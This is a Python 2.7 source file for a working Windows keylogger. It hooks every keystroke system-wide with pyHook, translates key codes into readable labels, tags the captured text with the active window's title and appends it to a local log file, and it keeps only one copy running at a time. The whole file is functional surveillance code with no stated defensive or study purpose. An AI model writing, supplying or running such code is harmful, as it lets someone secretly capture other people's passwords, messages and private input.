# python2.7

from __future__ import print_function
import pyHook
import pythoncom
import os
import psutil
import sys

log_file = 'log.txt'
current_window = ''

def is_current_script_running():
	script_name = os.path.basename(__file__)
	#print(script_name)
	processes = psutil.process_iter()
	for process in processes:
		#print(process._pid)
		if process.pid != os.getpid():
			try:
				args = process.cmdline()
				for arg in args:
					if script_name in arg:
						#print(args)
						return True
			except:
				#print('Unable to fetch arguments for: {0}'.format(process))
				print(end='')
	return False

def start_keylogging():
	hooks_manager = pyHook.HookManager()
	hooks_manager.KeyDown = on_keyboard_event
	hooks_manager.HookKeyboard()
	pythoncom.PumpMessages()

def get_ascii_value(ascii_vaue, keyId):
	keyIdDict = {
		  '8' : '<BACKSPACE>',
		  '9' : '<TAB>',
		 '13' : '<ENTER>',
		 '16' : '<SHIFT>',
		 '20' : '<CAPS LOCK>',
		 '37' : '<LEFT ARROW>',
		 '38' : '<UP ARROW>',
		 '39' : '<RIGHT ARROW>',
		 '40' : '<DOWN ARROW>',
		 '44' : '<PRT SCR>',
		 '45' : '<INSERT>',
		 '46' : '<DELETE>',
		 '91' : '<WIN>',
		'114' : '<NUM LOCK>',
		'160' : '<SHIFT>',
		'161' : '<SHIFT>',
		'162' : '<CTRL>',
		'163' : '<ALT>',
		'164' : '<ALT>',
		'165' : '<ALT>',
	}
	if ascii_vaue > 0:
		ascii_vaue = str(ascii_vaue)
		return keyIdDict[ascii_vaue] if ascii_vaue in keyIdDict and int(ascii_vaue) == keyId else chr(int(ascii_vaue))
	else:
		keyId = str(keyId)
		return keyIdDict[keyId] if keyId in keyIdDict else "<{0}>".format(keyId)

def write_to_file(file_name, string):
	with open(file_name, 'a') as logFile:
		logFile.write(string)

def write_current_window_value(activeWindow):
	global current_window

	flag = False
	if current_window and len(current_window) == 0:
		flag = True
	else:
		if current_window  != activeWindow:
			flag = True

	if flag:
		current_window = activeWindow

		# Creating header
		header = "\n\n## {0} ##\n".format(current_window)
		baseLine = '#'*(len(header)-3) + '\n\n'
		
		value_to_write = header + baseLine
		write_to_file(log_file, value_to_write)
		print(value_to_write, end='')

# Keyboard Event
def on_keyboard_event(event):
	
	#print(event.__dict__)
	character = get_ascii_value(event.Ascii, event.KeyID)
	write_current_window_value(event.WindowName)
	write_to_file(log_file, character)
	print(character, end='') # debugging
	return True

def main():
	if is_current_script_running():
	 	print('[x] Script is already running')
		sys.exit(0)
	start_keylogging()

if __name__ == '__main__':
	main()